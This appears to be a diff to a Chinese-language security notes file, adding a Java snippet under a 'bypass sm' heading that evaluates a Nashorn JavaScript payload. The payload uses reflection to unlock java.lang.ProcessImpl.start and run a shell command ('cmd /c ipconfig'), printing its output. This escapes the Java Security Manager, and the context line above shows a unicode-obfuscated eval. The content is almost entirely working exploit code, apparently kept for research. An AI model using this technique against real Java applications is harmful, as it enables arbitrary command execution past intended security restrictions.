@@ -8,7 +8,28 @@ new javax.script.ScriptEngineManager().getEngineByName("js").eval("new j\u0061va
 ## bypass sm
 参考 js的bypass
 ```java
-
+String bypass_sm_exp = "var str = Java.type('java.lang.String[]').class;" +
+                "var map = Java.type('java.util.Map').class;" +
+                "var string = Java.type('java.lang.String').class;" +
+                "var Redirect = Java.type('java.lang.ProcessBuilder.Redirect[]').class;" +
+                "var boolean = Java.type('boolean').class;" +
+                "var c = java.lang.Class.forName('java.lang.ProcessImpl');" +
+                "var start = c.getDeclaredMethod('start',str,map,string,Redirect,boolean);" +
+                "start.setAccessible(true);" +
+                "var anArray = [\"cmd\", \"/c\", \"ipconfig\"];" +
+                "var cmd = Java.to(anArray, Java.type(\"java.lang.String[]\"));" +
+                "var input = start.invoke(null,cmd,null,null,null,false).getInputStream();" +
+                "var reader = new java.io.BufferedReader(new java.io.InputStreamReader(input));" +
+                "var stringBuilder = new java.lang.StringBuilder();" +
+                "var line = null;" +
+                "while((line = reader.readLine())!=null){" +
+                "stringBuilder.append(line);" +
+                "stringBuilder.append('\\r\\n');"+
+                "}" +
+                "stringBuilder.toString();" +
+                "print(stringBuilder)";
+                
+ new javax.script.ScriptEngineManager().getEngineByName("js").eval(bypass_sm_exp);               
 ```
 
 >参考
